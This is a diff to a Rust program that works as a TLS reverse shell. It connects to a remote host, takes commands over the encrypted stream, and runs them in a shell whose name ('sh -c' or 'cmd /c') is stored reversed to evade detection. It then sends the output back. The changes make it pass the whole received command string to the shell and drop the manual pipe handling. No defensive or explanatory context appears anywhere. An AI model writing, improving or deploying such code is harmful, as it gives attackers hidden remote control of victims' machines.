@@ -1,13 +1,13 @@
 use std::io::{Read, Write };
 use std::net::{TcpStream, SocketAddr};
-use std::process::{Command, Stdio, exit};
-use std::str;
+use std::process::{Command, exit};
 use native_tls::TlsConnector;
 use std::env;
 
 
 
 fn main() {
+    
 
 
     let mut tls_build = TlsConnector::builder();
@@ -51,7 +51,6 @@ fn main() {
 
         }
 
-
         let osstr3 = if env::consts::OS == "windows" {
             "c/"
         } else if env::consts::OS == "linux" {
@@ -65,38 +64,16 @@ fn main() {
         let osstr2 = osstr.chars().rev().collect::<String>();
         let osstr4 = osstr3.chars().rev().collect::<String>();
         let main_command = split.next().unwrap();
-        let string2: Vec<&str> = main_command.split(" ").collect();
-        if let Ok(command) = Command::new(osstr2.clone()).arg(osstr4.clone()).args(&string2[0..]).output() {
+        
+        if let Ok(command) = Command::new(
+            osstr2.clone())
+            .args([osstr4.clone(),main_command.to_owned()])
+            .output() {
             if command.stdout.len() != 0 {
                 stream.write_all(&command.stdout).unwrap();
             }else {
                 stream.write_all(&command.stderr).unwrap();
             };
-        } else if main_command.contains("|") {
-            let string3: Vec<&str> = main_command.split("|").collect();
-            let string4: Vec<&str> = string3[0].split(" ").collect();
-            let string5: Vec<&str> = string3[1].split(" ").collect();
-            if let Ok(fp1) = Command::new(osstr2.clone())
-                .arg(osstr4.clone())
-                .arg(&string4[0])
-                .args(&string4[1..])
-                .stdout(Stdio::piped())
-                .spawn()
-            {
-                if let Ok(fp2) = Command::new(osstr2)
-                    .arg(osstr4.clone())
-                    .arg(string5[0])
-                    .args(&string5[1..])
-                    .stdin(fp1.stdout.expect("Command failed"))
-                    .output()
-                {
-                    let _ = stream.write_all(&fp2.stdout);
-                } else {
-                    let _ = stream.write_all(b"Error");
-                }
-            } else {
-                let _ = stream.write_all(b"");
-            }
         } else {
             let _ = stream.write_all(b"");
         }
